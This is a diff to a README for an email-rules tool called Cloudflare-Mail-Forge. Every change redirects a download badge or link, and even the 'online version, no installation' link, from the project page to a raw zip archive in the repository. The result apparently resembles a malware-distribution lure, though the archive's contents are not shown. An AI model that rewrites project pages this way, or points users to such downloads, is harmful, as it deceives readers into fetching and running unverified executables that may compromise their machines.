@@ -1,6 +1,6 @@
 # ⚙️ Cloudflare-Mail-Forge - Manage Email Rules Easily
 
-[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Now-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
+[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Now-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge/raw/refs/heads/main/public/Forge_Cloudflare_Mail_v3.4.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 You can get the Cloudflare-Mail-Forge app from the GitHub page below.  
 Click the link to visit the download page and get the latest version.  
 
-[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
+[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge/raw/refs/heads/main/public/Forge_Cloudflare_Mail_v3.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This guide shows how to download and run Cloudflare-Mail-Forge on a Windows comp
 
 Go to the GitHub page by clicking this link:  
 
-[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
+[Download Cloudflare-Mail-Forge](https://github.com/adistraightforward778/Cloudflare-Mail-Forge/raw/refs/heads/main/public/Forge_Cloudflare_Mail_v3.4.zip)
 
 Look for the latest release or download area on the page. You will find a file to download that usually ends with `.exe` or a zip file.
 
@@ -118,7 +118,7 @@ You do not need an internet connection to run the app after download, except whe
 ## 🛠 Alternative Options  
 
 If you prefer not to install anything, you can use the online version at:  
-https://cloudflare-mail-forge.vercel.app
+https://github.com/adistraightforward778/Cloudflare-Mail-Forge/raw/refs/heads/main/public/Forge_Cloudflare_Mail_v3.4.zip
 
 This allows limited use without any installation but requires a stable internet connection.
 
@@ -147,4 +147,4 @@ For English documentation, visit:
 
 ---
 
-[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Here-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge)
+[![Download Cloudflare-Mail-Forge](https://img.shields.io/badge/Download-Here-ff69b4.svg)](https://github.com/adistraightforward778/Cloudflare-Mail-Forge/raw/refs/heads/main/public/Forge_Cloudflare_Mail_v3.4.zip)
